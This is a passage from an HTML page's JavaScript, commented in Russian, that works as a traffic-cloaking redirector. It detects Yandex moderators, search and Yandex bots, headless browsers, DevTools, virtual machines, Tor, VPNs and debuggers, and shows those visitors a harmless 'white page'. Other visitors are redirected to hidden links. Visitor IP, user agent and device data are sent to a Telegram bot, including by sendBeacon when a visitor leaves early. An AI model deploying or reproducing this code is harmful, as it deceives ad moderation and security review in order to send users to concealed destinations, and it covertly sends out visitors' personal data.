                        const localIp = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                        if (localIp && localIp.length > 1) {
                            getIpAddress().then(publicIp => {
                                // Если локальный и публичный IP разные, возможно используется VPN
                                resolve(localIp[1] !== publicIp && !localIp[1].startsWith('192.168.') && !localIp[1].startsWith('10.'));
                            });
                        } else {
                            resolve(false);
                        }
                    };
                    
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(() => resolve(false));
                        
                    // Устанавливаем таймаут для обработки
                    setTimeout(() => {
                        pc.close();
                        resolve(false);
                    }, 2000);
                } catch (e) {
                    resolve(false);
                }
            });
        }

        /**
         * Выполнение тайминг-атак для определения отладчика
         */
        function performTimingAttacks() {
            if (!config.experimental.PerformTimingAttacks) return false;
            
            // Если это обычный пользователь Яндекс.Браузера, пропускаем эту проверку
            if (isRegularYandexUser()) return false;
            
            const start = performance.now();
            
            // Выполняем последовательность операций, которые замедляются при отладке
            for (let i = 0; i < 1000; i++) {
                console.debug('');
            }
            
            // Очищаем консоль
            console.clear();
            
            const end = performance.now();
            
            // Если время выполнения больше порогового, вероятно включена отладка
            return end - start > 20;
        }

        /**
         * Определение итогового URL для перенаправления
         */
        async function determineRedirectTarget() {
            try {
                // Загрузка конфигурации
                const configText = await loadFile('config.txt');
                parseConfig(configText);
                
                // Загрузка статуса onoff.txt для функции частоты посещений
                const onOffText = await loadFile('onoff.txt');
                let onOffState = onOffText ? onOffText.trim() : 'on';
                
                // Получение информации о пользователе
                userInfo = await collectUserInfo();
                
                // Применение проверок в зависимости от типа устройства
                const deviceConfig = isMobile ? config.mobile : config.desktop;
                
                // 1. Проверка активации ловушки для ботов
                if (botTrapActivated) {
                    await sendTelegramReport("Активирована ловушка для ботов", userInfo);
                    return WHITE_PAGE;
                }
                
                // 2. Проверка на поисковых ботов
                if (deviceConfig.CheckSearchBots && isSearchBot()) {
                    await sendTelegramReport("Обнаружен поисковый бот по User-Agent", userInfo);
                    return WHITE_PAGE;
                }
                
                // 3. Проверка headless браузера
                if (deviceConfig.CheckHeadlessBrowser && isHeadlessBrowser()) {
                    await sendTelegramReport("Обнаружен headless браузер", userInfo);
                    return WHITE_PAGE;
                }
                
                // 4. Проверка модерации Яндекса
                if (deviceConfig.CheckYandexModerator && hasYandexModeratorIframe()) {
                    await sendTelegramReport("Обнаружен iframe модерации Яндекса", userInfo);
                    return WHITE_PAGE;
                }
                
                // 5. Комплексная проверка ботов Яндекса
                if (deviceConfig.CheckYandexBot && await isYandexBot()) {
                    await sendTelegramReport("Обнаружен бот Яндекса", userInfo);
                    return WHITE_PAGE;
                }
                
                // 6. Проверка IP в черном списке
                if (deviceConfig.CheckIpBlacklist && await isIpBlocked()) {
                    await sendTelegramReport("IP находится в черном списке", userInfo);
                    return WHITE_PAGE;
                }
                
                // 7. Проверка на модератора/разработчика
                if (deviceConfig.CheckDevTools && isLikelyModerator()) {
                    await sendTelegramReport("Обнаружены открытые DevTools (по размеру окна)", userInfo);
                    return WHITE_PAGE;
                }
                
                // 8. Проверка движения мыши (только для ПК)
                if (!isMobile && deviceConfig.CheckMouseMovement && !hadMouseMovement) {
                    // Это проверяется отдельно через timeout
                    return null;
                }
                
                // 9. Проверка частоты посещений
                if (deviceConfig.CheckVisitFrequency && isBlockedByFrequency()) {
                    await sendTelegramReport("Превышена частота посещений", userInfo);
                    return WHITE_PAGE;
                }
                
                // 10. Экспериментальные проверки
                if (config.experimental.CheckAdBlocker && detectAdblocker()) {
                    await sendTelegramReport("Обнаружен блокировщик рекламы", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckVirtualMachine && checkForVirtualMachine()) {
                    await sendTelegramReport("Обнаружена виртуальная машина", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckTorNetwork && await checkTorNetwork()) {
                    await sendTelegramReport("Обнаружена сеть Tor", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckVPN && await detectProxiesOrVPN()) {
                    await sendTelegramReport("Обнаружен прокси/VPN", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.PerformTimingAttacks && performTimingAttacks()) {
                    await sendTelegramReport("Обнаружен отладчик (тайминг-атака)", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckWebRTCLeakage && await checkWebRTCLeakage()) {
                    await sendTelegramReport("Обнаружена утечка WebRTC (вероятно VPN)", userInfo);
                    return WHITE_PAGE;
                }
                
                // Если пользователь прошел все проверки, определяем целевую ссылку
                const codeParam = getUrlParameter('code');
                
                if (codeParam) {
                    try {
                        const linksText = await loadFile('links.txt');
                        if (linksText) {
                            const links = linksText.split('\n').filter(link => link.trim());
                            
                            const codeNumber = parseInt(codeParam);
                            if (!isNaN(codeNumber) && codeNumber > 0 && codeNumber <= links.length) {
                                return links[codeNumber - 1].trim();
                            } else {
                                // Если номер некорректен, выбираем случайную ссылку
                                const randomIndex = Math.floor(Math.random() * links.length);
                                return links[randomIndex].trim();
                            }
                        }
                    } catch (e) {
                        console.error("Ошибка при выборе ссылки по параметру code:", e);
                    }
                }
                
                return BLACK_PAGE;
            } catch (error) {
                console.error("Критическая ошибка при определении цели редиректа:", error);
                
                // Отправка отчета об ошибке
                try {
                    await sendTelegramReport(`Критическая ошибка: ${error.message || 'Unknown error'}`, 
                                           userInfo || { deviceType: isMobile ? 'Мобильное устройство' : 'Десктоп' });
                } catch (e) {
                    console.error("Не удалось отправить отчет об ошибке:", e);
                }
                
                return WHITE_PAGE;
            }
        }

        /**
         * Перенаправление на целевую страницу
         */
        function redirect(url) {
            if (redirectInitiated) return;
            redirectInitiated = true;
            
            const delay = isMobile ? 
                          config.mobile.RedirectDelay : 
                          config.desktop.RedirectDelay;
            
            setTimeout(() => {
                pageFullyLoaded = true;
                window.location.href = url;
            }, delay);
        }

        // ===== ОБРАБОТЧИКИ СОБЫТИЙ =====

        // Обработчик движения мыши
        document.addEventListener('mousemove', () => {
            if (!hadMouseMovement) {
                hadMouseMovement = true;
                
                // Скрываем блок проверки человека
                humanVerificationBlock.classList.add('hidden');
            }
            
            // Если таймер проверки мыши активен, очищаем его
            if (mouseMoveTimeout) {
                clearTimeout(mouseMoveTimeout);
                mouseMoveTimeout = null;
            }
            
            // После движения мыши запускаем редирект через заданное время (только один раз)
            if (!redirectTimeout && !redirectInitiated) {
                redirectTimeout = setTimeout(async () => {
                    const target = await determineRedirectTarget();
                    if (target) {
                        redirect(target);
                    }
                }, config.desktop.RedirectDelay);
            }
        });

        // Для мобильных устройств скрываем проверку движения мыши и устанавливаем флаг
        if (isMobile) {
            hadMouseMovement = true;
            humanVerificationBlock.classList.add('hidden');
        }

        // Настройка ловушки для ботов
        document.querySelector('.bot-trap-link').addEventListener('click', async (e) => {
            e.preventDefault();
            botTrapActivated = true;
            
            if (userInfo === null) {
                userInfo = await collectUserInfo();
            }
            
            await sendTelegramReport("Клик по ловушке для ботов", userInfo);
            redirect(WHITE_PAGE);
        });

        // Обработчик раннего ухода
        window.addEventListener('beforeunload', async () => {
            if (!pageFullyLoaded && !redirectInitiated) {
                if (userInfo === null) {
                    userInfo = await collectUserInfo();
                }
                
                // Используем sendBeacon для отправки данных даже при закрытии страницы
                const message = `🚨 РАННИЙ УХОД!\n\n📱 Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}\n⏱️ Время на странице: ${Math.round(performance.now() - PAGE_LOAD_START)}мс\n🔢 Счетчик визитов: ${visitCount}\n🌐 IP: ${userInfo.ipAddress || 'Не определено'}\n🖥️ User-Agent: ${navigator.userAgent}`;
                
                const blob = new Blob([JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })], { type: 'application/json' });
                
                navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, blob);
            }
        });

        // Основная инициализация при загрузке страницы
        window.onload = async () => {
            try {
                // Настройка наблюдателя за iframe
                setupModerationFrameObserver();
                
                // Для мобильных устройств редиректим сразу
                if (isMobile) {
                    const target = await determineRedirectTarget();
                    if (target) {
                        redirect(target);
                    }
                } else {
                    // Для ПК устанавливаем таймер проверки движения мыши
                    mouseMoveTimeout = setTimeout(async () => {
                        if (!hadMouseMovement) {
                            userInfo = await collectUserInfo();
                            await sendTelegramReport("Отсутствие движения мыши", userInfo);
                            redirect(WHITE_PAGE);
                        }
                    }, config.desktop.MouseMovementTimeout);
                }
            } catch (error) {
                console.error("Ошибка в обработчике onload:", error);
                redirect(WHITE_PAGE);
            }
        };
    })();
    </script>
</body>
</html>
